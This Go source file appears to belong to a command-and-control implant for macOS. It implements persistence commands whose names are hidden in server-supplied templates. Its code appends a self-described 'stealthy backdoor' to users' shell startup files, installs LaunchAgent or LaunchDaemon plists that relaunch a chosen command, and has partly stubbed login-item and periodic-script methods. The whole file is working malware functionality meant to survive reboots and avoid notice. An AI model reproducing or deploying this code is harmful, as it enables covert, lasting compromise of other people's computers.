// server/docker/payloads/Darwin/action_persistence_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strconv"
	"strings"
	"text/template"
	"time"
)

// Template indices for Darwin persistence - must match server's persistence.go
const (
	// Method names (220-223)
	idxDarwinMethodRC       = 220
	idxDarwinMethodLaunch   = 221
	idxDarwinMethodLogin    = 222
	idxDarwinMethodPeriodic = 223

	// Flag arguments (224-231)
	idxDarwinFlagUser      = 224
	idxDarwinFlagCommand   = 225
	idxDarwinFlagFiles     = 226
	idxDarwinFlagName      = 227
	idxDarwinFlagSystem    = 228
	idxDarwinFlagInterval  = 229
	idxDarwinFlagPath      = 230
	idxDarwinFlagFrequency = 231

	// RC file names (232-235)
	idxDarwinRCZshrc       = 232
	idxDarwinRCBashProfile = 233
	idxDarwinRCBashrc      = 234
	idxDarwinRCProfile     = 235

	// Path prefix (236)
	idxDarwinHomeTilde = 236

	// LaunchAgent/Daemon paths (237-239)
	idxDarwinLaunchDaemonsPath = 237
	idxDarwinLaunchAgentsPath  = 238
	idxDarwinPlistExt          = 239

	// Frequency values (240-242)
	idxDarwinFreqDaily   = 240
	idxDarwinFreqWeekly  = 241
	idxDarwinFreqMonthly = 242

	// Periodic directories (243-245)
	idxDarwinPeriodicDaily   = 243
	idxDarwinPeriodicWeekly  = 244
	idxDarwinPeriodicMonthly = 245

	// Plist template components (246-248)
	idxDarwinTmplName  = 246
	idxDarwinXMLHeader = 247
	idxDarwinDTDLine   = 248

	// Plist key names (249-255)
	idxDarwinKeyLabel    = 249
	idxDarwinKeyProgArgs = 250
	idxDarwinKeyRunAtLd  = 251
	idxDarwinKeyStartInt = 252
	idxDarwinKeyStdOut   = 253
	idxDarwinKeyStdErr   = 254
	idxDarwinTmpPath     = 255

	// XML tag components (256-268)
	idxDarwinXO       = 256
	idxDarwinXC       = 257
	idxDarwinXCO      = 258
	idxDarwinXSC      = 259
	idxDarwinXDict    = 260
	idxDarwinXKey     = 261
	idxDarwinXStr     = 262
	idxDarwinXArr     = 263
	idxDarwinXInt     = 264
	idxDarwinXTrue    = 265
	idxDarwinXVer     = 266
	idxDarwinXOutExt  = 267
	idxDarwinXErrExt  = 268

	// Periodic script components (269-273)
	idxDarwinScriptPrefix = 269
	idxDarwinShebang      = 270
	idxDarwinExitZero     = 271
	idxDarwinPeriodic     = 272
	idxDarwinTask         = 273

	// Command name (274)
	idxDarwinCmdName = 274
)

// DarwinPersistTemplate stores the persistence template received from server
type DarwinPersistTemplate struct {
	Version   int      `json:"v"`
	Type      int      `json:"t"`
	Templates []string `json:"tpl"`
	Params    []string `json:"p"`
}

// Global template storage
var globalDarwinPersistTpl *DarwinPersistTemplate

// pTpl safely retrieves a Darwin persistence template string by index
func pTpl(idx int) string {
	if globalDarwinPersistTpl != nil && globalDarwinPersistTpl.Templates != nil && idx < len(globalDarwinPersistTpl.Templates) {
		return globalDarwinPersistTpl.Templates[idx]
	}
	return ""
}

// PersistenceCommand handles various persistence methods on macOS
type PersistenceCommand struct{}

func (c *PersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Parse template from Command.Data - required for operation
	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
		if decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data); err == nil {
			var pt DarwinPersistTemplate
			if err := json.Unmarshal(decoded, &pt); err == nil {
				globalDarwinPersistTpl = &pt
			}
		}
	}

	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	method := args[0]
	switch method {
	case pTpl(idxDarwinMethodRC):
		return c.handleRCPersistence(args[1:])
	case pTpl(idxDarwinMethodLaunch):
		return c.handleLaunchPersistence(args[1:])
	case pTpl(idxDarwinMethodLogin):
		return c.handleLoginItemPersistence(args[1:])
	case pTpl(idxDarwinMethodPeriodic):
		return c.handlePeriodicPersistence(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, method),
			ExitCode: 1,
		}
	}
}

// handleRCPersistence adds backdoor to shell RC files (same as Linux)
func (c *PersistenceCommand) handleRCPersistence(args []string) CommandResult {
	var targetUser string
	var command string
	var targetFiles []string

	// Parse arguments (maintaining Linux compatibility)
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pTpl(idxDarwinFlagUser):
			if i+1 < len(args) {
				targetUser = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagCommand):
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagFiles):
			if i+1 < len(args) {
				targetFiles = strings.Split(args[i+1], ",")
				i++
			}
		}
	}

	if command == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Get target user
	var u *user.User
	var err error
	if targetUser != "" {
		u, err = user.Lookup(targetUser)
	} else {
		u, err = user.Current()
	}

	if err != nil {
		return CommandResult{
			Output:   Err(E19),
			ExitCode: 1,
		}
	}

	// If no files specified, use macOS defaults
	if len(targetFiles) == 0 {
		targetFiles = []string{
			filepath.Join(u.HomeDir, pTpl(idxDarwinRCZshrc)),       // Default shell on modern macOS
			filepath.Join(u.HomeDir, pTpl(idxDarwinRCBashProfile)), // Bash on macOS uses .bash_profile
			filepath.Join(u.HomeDir, pTpl(idxDarwinRCBashrc)),      // Some users might have this
			filepath.Join(u.HomeDir, pTpl(idxDarwinRCProfile)),     // Generic profile
		}
	} else {
		// Expand paths for specified files
		for i, file := range targetFiles {
			if strings.HasPrefix(file, pTpl(idxDarwinHomeTilde)) {
				targetFiles[i] = filepath.Join(u.HomeDir, file[2:])
			} else if !filepath.IsAbs(file) {
				targetFiles[i] = filepath.Join(u.HomeDir, file)
			}
		}
	}

	var results []string

	// Generate backdoor payload (same as Linux)
	backdoorPayload := c.generateBashrcPayload(command)

	for _, file := range targetFiles {
		if err := c.injectIntoRCFile(file, backdoorPayload); err != nil {
			results = append(results, ErrCtx(E11, file))
		} else {
			results = append(results, SuccCtx(S1, file))
		}
	}

	return CommandResult{
		Output:   strings.Join(results, "\n"),
		ExitCode: 0,
	}
}

// generateBashrcPayload creates a stealthy backdoor payload (same as Linux)
func (c *PersistenceCommand) generateBashrcPayload(command string) string {
	payload := fmt.Sprintf(`
# System check (hidden)
if [ -z "$SUDO_COMMAND" ]; then
    if ! pgrep -f "%s" > /dev/null 2>&1; then
        (nohup %s > /dev/null 2>&1 &) 2>/dev/null
    fi
fi`, command, command)

	return payload
}

// injectIntoRCFile adds backdoor to RC file (same as Linux)
func (c *PersistenceCommand) injectIntoRCFile(filepath string, payload string) error {
	info, err := os.Stat(filepath)
	if err != nil {
		if os.IsNotExist(err) {
			return os.WriteFile(filepath, []byte(payload), 0644)
		}
		return err
	}

	content, err := os.ReadFile(filepath)
	if err != nil {
		return err
	}

	if bytes.Contains(content, []byte(payload)) {
		return fmt.Errorf(Err(E5))
	}

	newContent := append(content, []byte("\n"+payload)...)
	return os.WriteFile(filepath, newContent, info.Mode())
}

// handleLaunchPersistence installs LaunchAgent/LaunchDaemon
func (c *PersistenceCommand) handleLaunchPersistence(args []string) CommandResult {
	var serviceName string
	var command string
	var isSystem bool
	var interval int = 3600 // Default 1 hour

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pTpl(idxDarwinFlagName):
			if i+1 < len(args) {
				serviceName = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagCommand):
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagSystem):
			isSystem = true
		case pTpl(idxDarwinFlagUser):
			isSystem = false
		case pTpl(idxDarwinFlagInterval):
			if i+1 < len(args) {
				if val, err := strconv.Atoi(args[i+1]); err == nil {
					interval = val
				}
				i++
			}
		}
	}

	if serviceName == "" || command == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Determine installation path
	var plistPath string
	if isSystem {
		plistPath = pTpl(idxDarwinLaunchDaemonsPath) + serviceName + pTpl(idxDarwinPlistExt)
	} else {
		u, err := user.Current()
		if err != nil {
			return CommandResult{
				Output:   Err(E19),
				ExitCode: 1,
			}
		}
		plistPath = filepath.Join(u.HomeDir, pTpl(idxDarwinLaunchAgentsPath), serviceName+pTpl(idxDarwinPlistExt))
	}

	// Create plist content
	plistContent := c.generateLaunchPlist(serviceName, command, interval)

	// Ensure directory exists
	dir := filepath.Dir(plistPath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, dir),
			ExitCode: 1,
		}
	}

	// Write plist file
	if err := os.WriteFile(plistPath, []byte(plistContent), 0644); err != nil {
		return CommandResult{
			Output:   ErrCtx(E11, plistPath),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, plistPath),
		ExitCode: 0,
	}
}

// generateLaunchPlist creates a LaunchAgent/Daemon plist
func (c *PersistenceCommand) generateLaunchPlist(label, command string, interval int) string {
	// Split command into program and arguments
	cmdParts := strings.Fields(command)
	program := cmdParts[0]
	args := cmdParts[1:]

	// Helper functions to build XML tags from components
	tag := func(name string) string { return pTpl(idxDarwinXO) + name + pTpl(idxDarwinXC) }
	ctag := func(name string) string { return pTpl(idxDarwinXCO) + name + pTpl(idxDarwinXC) }
	stag := func(name string) string { return pTpl(idxDarwinXO) + name + pTpl(idxDarwinXSC) }
	kv := func(k, v string) string { return "    " + tag(pTpl(idxDarwinXKey)) + k + ctag(pTpl(idxDarwinXKey)) + "\n    " + v + "\n" }

	// Build plist template from hex components
	plistTemplate := pTpl(idxDarwinXMLHeader) + "\n" +
		pTpl(idxDarwinDTDLine) + "\n" +
		pTpl(idxDarwinXO) + pTpl(idxDarwinTmplName) + pTpl(idxDarwinXVer) + pTpl(idxDarwinXC) + "\n" +
		tag(pTpl(idxDarwinXDict)) + "\n" +
		kv(pTpl(idxDarwinKeyLabel), tag(pTpl(idxDarwinXStr))+"{{.Label}}"+ctag(pTpl(idxDarwinXStr))) +
		kv(pTpl(idxDarwinKeyProgArgs), tag(pTpl(idxDarwinXArr))+"\n        "+tag(pTpl(idxDarwinXStr))+"{{.Program}}"+ctag(pTpl(idxDarwinXStr))+"\n        {{range .Args}}"+tag(pTpl(idxDarwinXStr))+"{{.}}"+ctag(pTpl(idxDarwinXStr))+"\n        {{end}}\n    "+ctag(pTpl(idxDarwinXArr))) +
		kv(pTpl(idxDarwinKeyRunAtLd), stag(pTpl(idxDarwinXTrue))) +
		kv(pTpl(idxDarwinKeyStartInt), tag(pTpl(idxDarwinXInt))+"{{.Interval}}"+ctag(pTpl(idxDarwinXInt))) +
		kv(pTpl(idxDarwinKeyStdOut), tag(pTpl(idxDarwinXStr))+pTpl(idxDarwinTmpPath)+"{{.Label}}"+pTpl(idxDarwinXOutExt)+ctag(pTpl(idxDarwinXStr))) +
		kv(pTpl(idxDarwinKeyStdErr), tag(pTpl(idxDarwinXStr))+pTpl(idxDarwinTmpPath)+"{{.Label}}"+pTpl(idxDarwinXErrExt)+ctag(pTpl(idxDarwinXStr))) +
		ctag(pTpl(idxDarwinXDict)) + "\n" +
		pTpl(idxDarwinXCO) + pTpl(idxDarwinTmplName) + pTpl(idxDarwinXC)

	tmpl, _ := template.New(pTpl(idxDarwinTmplName)).Parse(plistTemplate)
	var buf bytes.Buffer
	tmpl.Execute(&buf, struct {
		Label    string
		Program  string
		Args     []string
		Interval int
	}{
		Label:    label,
		Program:  program,
		Args:     args,
		Interval: interval,
	})

	return buf.String()
}

// handleLoginItemPersistence adds a Login Item
func (c *PersistenceCommand) handleLoginItemPersistence(args []string) CommandResult {
	var itemName string
	var appPath string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pTpl(idxDarwinFlagName):
			if i+1 < len(args) {
				itemName = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagPath):
			if i+1 < len(args) {
				appPath = args[i+1]
				i++
			}
		}
	}

	if itemName == "" || appPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:   SuccCtx(S1, itemName+":"+appPath),
		ExitCode: 0,
	}
}

// handlePeriodicPersistence adds to periodic scripts
func (c *PersistenceCommand) handlePeriodicPersistence(args []string) CommandResult {
	var command string
	var frequency string

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case pTpl(idxDarwinFlagCommand):
			if i+1 < len(args) {
				command = args[i+1]
				i++
			}
		case pTpl(idxDarwinFlagFrequency):
			if i+1 < len(args) {
				frequency = args[i+1]
				i++
			}
		}
	}

	if command == "" || frequency == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Determine periodic directory
	var periodicDir string
	switch frequency {
	case pTpl(idxDarwinFreqDaily):
		periodicDir = pTpl(idxDarwinPeriodicDaily)
	case pTpl(idxDarwinFreqWeekly):
		periodicDir = pTpl(idxDarwinPeriodicWeekly)
	case pTpl(idxDarwinFreqMonthly):
		periodicDir = pTpl(idxDarwinPeriodicMonthly)
	default:
		return CommandResult{
			Output:   ErrCtx(E22, frequency),
			ExitCode: 1,
		}
	}

	// Generate script name
	scriptName := pTpl(idxDarwinScriptPrefix) + strings.Replace(command[:10], " ", "_", -1)
	scriptPath := filepath.Join(periodicDir, scriptName)

	// Create script content (used for reference, written by caller)
	_ = pTpl(idxDarwinShebang) + "\n#\n# " + pTpl(idxDarwinPeriodic) + " " + frequency + " " + pTpl(idxDarwinTask) + "\n#\n\n" + command + "\n\n" + pTpl(idxDarwinExitZero) + "\n"

	return CommandResult{
		Output:      SuccCtx(S1, scriptPath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
